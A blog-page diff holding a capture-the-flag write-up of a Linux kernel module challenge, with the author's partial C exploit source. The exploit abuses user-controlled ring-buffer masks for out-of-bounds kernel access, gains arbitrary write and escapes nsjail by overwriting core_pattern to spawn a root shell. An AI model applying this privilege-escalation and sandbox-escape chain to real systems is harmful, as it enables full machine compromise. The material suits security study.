@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+    <title>Matus Mandzak</title>
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="/assets/css/blog.css">
+  </head>
+  <body>
+    <div class="centered"><header class="flex justify-between align-center centered mb-3"><h1 class="no-margin flex text-xxl font-bold text-black">
+      <a href="/" class="red">Matus Mandzak <span class="yellow font-light">- ACSC 2025 - Loti</span></a>
+    </h1>
+    <nav class="flex yellow"><div class="mr-2 ml-2">|</div>
+            <a class="page-link transition-colors hover:text-red text-l" href="/posts.html">blog</a></nav>
+</header>
+<div class="flex justify-between align-center centered mb-3">
+  veni vidi pwni
+</div>
+<p class="centered font-light no-margin text-xl grey5  mb-3 mt-12 ">  ACSC 2025 - Loti </p>
+    <!-- Subtitle: left-aligned inside centered parent -->
+    <div class="centered">
+      <div class="fit-content mt-1 no-margin text-s font-bold grey5 no-margin rounded bg-red pl-2 pr-2">
+      pwn
+    </div>
+    </div>
+    
+    <div class="centered"><p><em>Having fun with kernel pwn and shared buffers and rigns</em></p>
+
+<p>This challenge is from 2025’s Austrian Cyber Security Challenge quals. I got hands on this challenge directly from the author Georg (crazy austrian pwner <a href="https://github.com/gfelber">0x6fe1be2</a>) while preparing for Team Europe Quals back in may. I mamanged to solve it back then, but didn’t found time to write down a writeup, so I’m doing it now 6 months later.</p>
+
+<h1 id="challenge-overview">Challenge Overview</h1>
+<p>The challenge is classical linux kernel one - basic linux with custom kernel module. We are given the usual files as bzImage, rootfs.cpio.gz, run.sh, but Georg was so nice he packed his quick kernel ctf scripts and setup for running the challenges quickly. You can find the main structure here: <a href="https://github.com/gfelber/how2keap">https://github.com/gfelber/how2keap</a></p>
+
+<p>We have got a source code for the kernel module, so opening Ghidra is not needed at all. The module is relatively simple. It implements a ring functionality that processes commands via shared memory ring buffer,similar to linux’s io_uring, but simplified.</p>
+
+<p>During initialization it allocates a struct ring_meta and a struct ring_buf. The ring_buf is allocated using vzalloc (vmalloc), while ring_meta is allocated using kzalloc(). It also starts a dedicated kernel thread ring_thread to process requests.</p>
+
+<p>The module implements also mmap which creates a shared memory between kernel and userspace for the ring buffer.</p>
+
+<p>Ring thread sits in a loop while checking submission queue based on sq-&gt;head and sq-&gt;tail. 
+It allows for 4 operations:</p>
+
+<ul>
+  <li>
+    <p>RING_OP_CREATE: Allocates a buffer (rmeta-&gt;data) of a user-specified size via kzalloc.</p>
+  </li>
+  <li>
+    <p>RING_OP_READ: Copies data from the kernel buffer rmeta-&gt;data to the shared output buffer.</p>
+  </li>
+  <li>
+    <p>RING_OP_WRITE: Copies data from the shared input buffer to the kernel buffer rmeta-&gt;data. Limited by size field.</p>
+  </li>
+  <li>
+    <p>RING_OP_DELETE: Frees the kernel buffer</p>
+  </li>
+</ul>
+
+<p>Note: This qemu uses nsjail, so we need to escape this aswell.</p>
+
+<h2 id="vulnerability">Vulnerability</h2>
+
+<p>The vulnerability in the code is not that hard to spot, since the kernel module utilized shared memory the user controls this structure at all times. Since it also trusts the mask fields inside the shared memory structure ring_buf to determine the bounds of the ring buffer indices.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sq</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">=</span> <span class="p">(</span><span class="n">sq</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">sq</span><span class="o">-&gt;</span><span class="n">mask</span><span class="p">;</span>
+<span class="n">cq</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">=</span> <span class="p">(</span><span class="n">cq</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">cq</span><span class="o">-&gt;</span><span class="n">mask</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Since <code class="language-plaintext highlighter-rouge">sq</code> and <code class="language-plaintext highlighter-rouge">cq</code> are inside <code class="language-plaintext highlighter-rouge">rbuf</code> (mapped to user space), the attacker can modify <code class="language-plaintext highlighter-rouge">sq-&gt;mask</code> and <code class="language-plaintext highlighter-rouge">cq-&gt;mask</code>. By setting the mask to 0xFFFFFFFFFFFFFFFF, the bitwise AND operation effectively does nothing. This allows the attacker to increment <code class="language-plaintext highlighter-rouge">sq-&gt;head</code> or <code class="language-plaintext highlighter-rouge">cq-&gt;tail</code> to arbitrary values, causing the kernel to read/write submission_entry and completion_entry structures outside the bounds of the allocated buffer.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>Since <code class="language-plaintext highlighter-rouge">kaslr</code> is enabled first we need to obtain a leak. We can spray a bunch of ring_buf structs on the heap to get predictable heap sace and by modifying sq-&gt;head we can read to read pointers from adjacent struct, because the module always copies submission data to completion queue:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cqe</span><span class="o">-&gt;</span><span class="n">user_data</span> <span class="o">=</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">user_data</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>This allows to leak kernel base and page base of the current <code class="language-plaintext highlighter-rouge">ring_buf</code> struct. 
+One would think this is enough to use arbitrary write and read, but this OOB is not the cleanest for two reasons:</p>
+
+<ol>
+  <li>OOB read only works for values at 0x28. The kernel is reading a 40-byte (0x28) structure from the raw memory of the kernel heap.
+```c  <br />
+struct submission_entry {
+  __u32 op;           // 4 bytes
+  __u32 flags;        // 4 bytes
+  __u64 params[3];    // 24 bytes
+  __u64 user_data;    // 8 bytes  &lt;– THIS IS THE LEAK
+};</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+2. OOB write has similar problem allowing us to write only one qword separated by null bytes, which is not the best for writing strings. (Why strings? read further, tldr: core pattern) We could try to ROP from here, but this seemed too complex and we can find simpler way.
+```c
+struct completion_entry {
+    u64 user_data; // Controlled (8 bytes)
+    int rc;        // NOT Controlled (usually 0) (4 bytes)
+    u32 padding;   // Uninitialized/Padding (4 bytes)
+};
+</code></pre></div></div>
+
+<h2 id="trying-to-get-flag-then-leaking-rmeta-and-getting-flag">Trying to get flag, then leaking rmeta and getting flag</h2>
+<p>At first I tried using only previous OOB write only to end up like this:</p>
+
+<p><img src="/assets/images/loti-discord.png" alt="Loti discord" /></p>
+
+<p>The other issue was escaping nsjail. Getting root shell isn’t enough because we need to read flag from outside the namespace.</p>
+
+<p>However this is the same setup as they use in kCTF, so we can get our inspiration there.</p>
+
+<p>This submission <a href="https://github.com/st424204/security-research/tree/fa3bed7298d85865bd1109fc278b982dc725cf28/pocs/linux/kernelctf/CVE-2024-36972_lts_cos">CVE-2024-36972</a> shows us a way to PrivEsc. It corrupts <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/core_pattern</code> which is actually execute outside the sandbox to point to our binary through <code class="language-plaintext highlighter-rouge">/proc/%P/fd/666 %P</code> (note that the kernel replace %P with the PID of your binary)</p>
+
+<p>I tried doing that, but only to get into the OOB write null byte problem and since the string we need to write is bigger than 8 bytes and the linux does not allow null bytes in filenames I could not get anywhere.</p>
+
+<p>At first I tried to bypass this by creating a new file with a script there to read flag, but the problem was to get to this file from root namespace, since it was created is nsjail’s one.</p>
+
+<p>I also had desperate try using <code class="language-plaintext highlighter-rouge">*</code>, to make the payload smaller, but this is just a bash thing so it won’t work here. In bash you can use <code class="language-plaintext highlighter-rouge">/*/*/*.txt</code> and bash will resolve this to any file that has this structure <code class="language-plaintext highlighter-rouge">/AAA/BBB/CCC.txt</code></p>
+
+<p>Since this does not work, let’s find a better way.</p>
+
+<p>The module created thread stack for each thread of our spray and suprisingly it lies always at constant offset from the ring_buf. (At least in the same environment.) Only problem is that the allocated thread stack after ring buffer is not the thread stack of current ring_buf but different one and its not that hard to find.</p>
+
+<p>Using this offset to thread stack we can leak ring_meta pointer from this stack and using the same principle for OOB write to overwrite ring_meta size field to -1 allowing us to write more cleanly. 
+The RING_OP_WRITE is bound checked using this size therefore overwriting this allows us to get true ARB write.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span> <span class="p">(</span><span class="n">sqe</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">rmeta</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">||</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">rmeta</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">||</span>
+            <span class="p">(</span><span class="n">sqe</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">&gt;</span> <span class="n">rmeta</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">||</span>
+            <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">rmeta</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">||</span>
+            <span class="p">(</span><span class="n">sqe</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">&gt;</span> <span class="n">rmeta</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">rc</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+          <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">memcpy</span><span class="p">(</span><span class="n">rmeta</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">+</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">rbuf</span><span class="o">-&gt;</span><span class="n">in_buf</span> <span class="o">+</span> <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
+               <span class="n">sqe</span><span class="o">-&gt;</span><span class="n">params</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</code></pre></div></div>
+
+<p>Using this we just calculate offset from the second <code class="language-plaintext highlighter-rouge">ring_buf</code> and get the flag.</p>
+
+<p>The only issue in remote vs local were the offsets to the thread stack, and Getting proper alignment with 0x28 read, but this could be easily bruteforce since the offsets did not change across even after rebooting the kernel.</p>
+
+<p>After solving the challenge Georg told me to look into BPF JIT Spray, quote “it is insanly powerfull and badly randomized, with big enough spary KASLR becomes predictable” and I still need to do it even 6 months after.</p>
+
+<p>Attaching official solution:</p>
+
+<p><img src="/assets/images/loti-discord-2.png" alt="alt text" /></p>
+
+<p>And my pwn.c</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GNU_SOURCE
+#include</span> <span class="cpf">"libs/pwn.h"</span><span class="cp">
+#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sched.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
+</span>
+
+<span class="cp">#define CORE +0x00eb5480
+</span>
+<span class="kt">char</span> <span class="o">*</span><span class="n">TARGET_CORE</span> <span class="o">=</span> <span class="s">"|/"</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="c1">// #define SYS_pidfd_getfd 438</span>
+		<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">strtoull</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+		<span class="kt">int</span> <span class="n">pfd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_pidfd_open</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+		<span class="kt">int</span> <span class="n">stdinfd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_pidfd_getfd</span><span class="p">,</span> <span class="n">pfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+		<span class="kt">int</span> <span class="n">stdoutfd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_pidfd_getfd</span><span class="p">,</span> <span class="n">pfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+		<span class="kt">int</span> <span class="n">stderrfd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_pidfd_getfd</span><span class="p">,</span> <span class="n">pfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+		<span class="n">dup2</span><span class="p">(</span><span class="n">stdinfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+		<span class="n">dup2</span><span class="p">(</span><span class="n">stdoutfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+		<span class="n">dup2</span><span class="p">(</span><span class="n">stderrfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+		<span class="n">system</span><span class="p">(</span><span class="s">"cat /flag"</span><span class="p">);</span>
+		<span class="n">execlp</span><span class="p">(</span><span class="s">"bash"</span><span class="p">,</span> <span class="s">"bash"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="kt">int</span> <span class="n">memfd</span> <span class="o">=</span> <span class="n">memfd_create</span><span class="p">(</span><span class="s">""</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">SYSCHK</span><span class="p">(</span><span class="n">sendfile</span><span class="p">(</span><span class="n">memfd</span><span class="p">,</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/exe"</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">));</span>
+  <span class="n">dup2</span><span class="p">(</span><span class="n">memfd</span><span class="p">,</span> <span class="mi">666</span><span class="p">);</span>
+  <span class="n">close</span><span class="p">(</span><span class="n">memfd</span><span class="p">);</span>
+  <span class="n">lstage</span><span class="p">(</span><span class="s">"INIT"</span><span class="p">);</span>
+  <span class="n">rlimit_increase</span><span class="p">(</span><span class="n">RLIMIT_NOFILE</span><span class="p">);</span>
+  <span class="n">pin_cpu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+
+  <span class="kt">int</span> <span class="n">ring_fds</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">ring_fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/ring"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="kt">int</span> <span class="n">BUF_IDX</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span><span class="c1">// find on remote</span>
+  <span class="kt">int</span> <span class="n">ring_fd2</span> <span class="o">=</span> <span class="n">ring_fds</span><span class="p">[</span><span class="n">BUF_IDX</span><span class="p">];</span> 
+
+  <span class="k">struct</span> <span class="n">ring_buf</span> <span class="o">*</span><span class="n">rbuf2</span> <span class="o">=</span> <span class="n">SYSCHK</span><span class="p">(</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdeadbeef000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">ring_fd2</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
+
+  <span class="n">ring_fd</span> <span class="o">=</span> <span class="n">ring_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+  <span class="n">rbuf</span> <span class="o">=</span> <span class="n">SYSCHK</span><span class="p">(</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdeadbeee000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">ring_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
+  <span class="k">struct</span> <span class="n">submission_queue</span> <span class="o">*</span><span class="n">sq</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rbuf</span><span class="o">-&gt;</span><span class="n">submission</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">completion_queue</span> <span class="o">*</span><span class="n">cq</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rbuf</span><span class="o">-&gt;</span><span class="n">completion</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x2000</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">op</span> <span class="o">=</span> <span class="n">RING_OP_CREATE</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">params</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">MAX_SIZE</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">user_data</span> <span class="o">=</span> <span class="mh">0xdead0001</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">cq</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">==</span> <span class="n">cq</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">usleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">linfo</span><span class="p">(</span><span class="s">"CREATE returned %d"</span><span class="p">,</span> <span class="n">cq</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">cq</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">].</span><span class="n">rc</span><span class="p">);</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">mask</span> <span class="o">=</span> <span class="mh">0xffffffffffffffff</span><span class="p">;</span>
+  <span class="n">cq</span><span class="o">-&gt;</span><span class="n">mask</span> <span class="o">=</span> <span class="mh">0xffffffffffffffff</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">submission_queue</span> <span class="o">*</span><span class="n">sq2</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rbuf2</span><span class="o">-&gt;</span><span class="n">submission</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">completion_queue</span> <span class="o">*</span><span class="n">cq2</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rbuf2</span><span class="o">-&gt;</span><span class="n">completion</span><span class="p">;</span>
+
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">].</span><span class="n">op</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">=</span> <span class="mh">0x2b9</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">=</span> <span class="mh">0x2c4</span><span class="p">;</span>
+
+  <span class="n">usleep</span><span class="p">(</span><span class="mi">100000</span><span class="p">);</span>
+  <span class="c1">//print_hex((char *)rbuf + 0x1c0, 0x200);</span>
+  <span class="kt">long</span> <span class="kt">long</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">rbuf</span> <span class="o">+</span> <span class="mh">0x1b0</span><span class="p">);</span>
+  <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">-</span> <span class="mh">0xb23e7</span><span class="p">;</span><span class="c1">//- 0x3bde8;//- 0x6afe1d;// ;</span>
+  <span class="kt">long</span> <span class="kt">long</span> <span class="n">page_base</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">rbuf</span> <span class="o">+</span> <span class="mh">0x1d0</span><span class="p">);</span>
+  <span class="n">page_base</span> <span class="o">=</span> <span class="n">page_base</span> <span class="o">-</span> <span class="mh">0x6de8</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="kt">long</span> <span class="n">page_base2</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">rbuf</span> <span class="o">+</span> <span class="mh">0x190</span><span class="p">);</span>
+  <span class="n">page_base2</span> <span class="o">=</span> <span class="n">page_base2</span><span class="p">;</span><span class="c1">// + 0x632ba0;</span>
+  <span class="kt">long</span> <span class="kt">long</span> <span class="n">stack_leak</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">rbuf</span> <span class="o">+</span> <span class="mh">0x1d0</span><span class="p">);</span>
+  <span class="n">stack_leak</span> <span class="o">=</span> <span class="n">page_base</span> <span class="o">+</span>  <span class="mh">0x159e60</span> <span class="o">+</span> <span class="n">BUF_IDX</span> <span class="o">*</span> <span class="mh">0x5000</span> <span class="p">;</span><span class="c1">//- 0x8000; // change ringfd2 idx based on this</span>
+  <span class="n">print_hex</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">rbuf</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Kernel base: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernel_base</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Page base: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">page_base</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Page base2: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">page_base2</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Stack leak: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">stack_leak</span><span class="p">);</span>
+  <span class="c1">//print_hex(rbuf, 0x200);</span>
+  <span class="k">if</span> <span class="p">(((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">kernel_base</span> <span class="o">&amp;</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)(</span><span class="mh">0xffffffff000000ff</span><span class="p">))</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="mh">0xffffffff00000000</span><span class="p">){</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Kernel base not found, exiting"</span><span class="p">);</span>
+    <span class="n">destructor</span><span class="p">();</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>  
+
+  <span class="kt">uint64_t</span> <span class="n">core_pattern</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="n">CORE</span><span class="p">;</span>
+  <span class="n">linfo</span><span class="p">(</span><span class="s">"Core pattern: %llx"</span><span class="p">,</span> <span class="n">core_pattern</span><span class="p">);</span>
+  <span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">stack_leak</span> <span class="o">-</span> <span class="n">page_base</span><span class="p">)</span><span class="o">/</span><span class="mh">0x28</span><span class="p">;</span>
+  <span class="n">linfo</span><span class="p">(</span><span class="s">"Offset: %llx"</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+  
+  <span class="c1">// prepare fake ring_meta-&gt;size</span>
+  <span class="k">struct</span> <span class="n">ring_meta</span> <span class="o">*</span><span class="n">rmeta</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ring_meta</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">rbuf</span><span class="o">+</span><span class="mh">0x100</span><span class="p">);</span>
+  <span class="n">rmeta</span><span class="o">-&gt;</span><span class="n">stop</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">rmeta</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">stack_leak</span><span class="p">;</span>
+  <span class="n">rmeta</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0xffffffffffffffff</span><span class="p">;</span>
+  <span class="n">rmeta</span><span class="o">-&gt;</span><span class="n">ring</span> <span class="o">=</span> <span class="n">page_base</span><span class="p">;</span>
+  <span class="n">rmeta</span><span class="o">-&gt;</span><span class="kr">thread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+  <span class="n">cq</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">=</span> <span class="n">offset</span><span class="p">;</span>
+  <span class="n">sq</span><span class="o">-&gt;</span><span class="n">tail</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="n">usleep</span><span class="p">(</span><span class="mi">100000</span><span class="p">);</span>
+  <span class="kt">long</span> <span class="kt">long</span> <span class="n">rmeta_ptr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">rbuf</span> <span class="o">+</span> <span class="mh">0x180</span><span class="p">);</span>
+  <span class="n">linfo</span><span class="p">(</span><span class="s">"Rmeta ptr: %p"</span><span class="p">,</span> <span class="n">rmeta_ptr</span><span class="p">);</span>
+  <span class="n">lstage</span><span class="p">(</span><span class="s">"Create second data buffer"</span><span class="p">);</span>
+
+  <span class="n">lstage</span><span class="p">(</span><span class="s">"Overwriting ring_buf2 size fields"</span><span class="p">);</span>
